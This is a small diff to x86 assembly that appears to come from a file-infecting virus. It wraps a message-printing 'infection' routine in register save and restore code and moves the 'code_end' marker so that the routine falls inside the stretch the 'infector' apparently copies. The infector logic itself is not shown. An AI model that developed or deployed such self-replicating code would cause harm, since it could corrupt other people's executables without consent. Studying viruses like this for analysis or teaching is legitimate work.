@@ -55,12 +55,21 @@ system_call:
 
 code_start:
 infection:
+    push    ebp             ; Save caller state
+    mov     ebp, esp
+    pushad                  ; Save some more caller state
+
     ; Print message
     mov     eax, WRITE
     mov     ebx, STDOUT
     mov     ecx, MSG
     mov     edx, MSG_LEN
     int     0x80
+
+    popad                   ; Restore caller state (registers)
+    pop     ebp             ; Restore caller state
+    ret                     ; Back to caller
+code_end:
 infector:
     push    ebp             ; Save caller state
     mov     ebp, esp
@@ -89,4 +98,3 @@ infector:
     popad                   ; Restore caller state (registers)
     pop     ebp             ; Restore caller state
     ret                     ; Back to caller
-code_end:
